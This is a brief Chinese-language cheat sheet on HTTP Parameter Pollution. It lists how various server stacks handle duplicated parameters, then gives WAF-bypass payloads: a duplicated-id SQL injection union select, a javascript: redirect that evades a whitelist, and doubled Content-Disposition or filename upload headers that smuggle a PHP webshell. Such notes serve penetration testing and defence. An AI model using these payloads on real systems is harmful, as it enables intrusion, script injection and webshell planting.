# HPP

---

**介绍**

```
HPP 是 HTTP Parameter Pollution 的缩写，意思即“ HTTP 参数污染 ”,属于注入型漏洞
注入地方在于请求包的提交参数，用于绕过waf
```

比如：get请求q=100&q=200，第一种情况是q=100，第二种情况是q=200，第三种q=100 200

不同服务不同处理方式

```
php/apache           last
jsp/tomcat           first
perl(cgi)/apache     first
python/apache        all
asp/iis              all
```

HPP可以作用于不同漏洞配合进行waf绕过

```
1.sql注入
&amp; -> &
&amp;nbsp -> &nbsp -> 空格

正常：   id=0 union select 1,2,3
HPP绕过：id=0&amp;id=7 union select 1,2,3
---
2.伪协议注入
http:// 、 ftp:// 、javascript://

dest=javascript://alert(document.domain)
如：只允许同源域名的白名单绕过
dest=javascript:/xxxx.com/i&dest=alert(document.domain)
=》dest=javascript://alert(document.domain)
---
3.文件上传
双Content-Disposition:上传--
    Content-Disposition: form-data; name="file"; filename="test.txt" 
    Content-Disposition: form-data; name="file"; filename="test.php" 
双文件名上传--
	Content-Disposition: form-data; name="file"; filename="test.txt";filename="test.php"
双文件上传--
    ---xxxxx
    Content-Disposition: form-data; name="file"; filename="test.txt";filename="test.jpg"
    图片内容
    ---
    Content-Disposition: form-data; name="file"; filename="test.txt";filename="test.php"
    muma内容
```

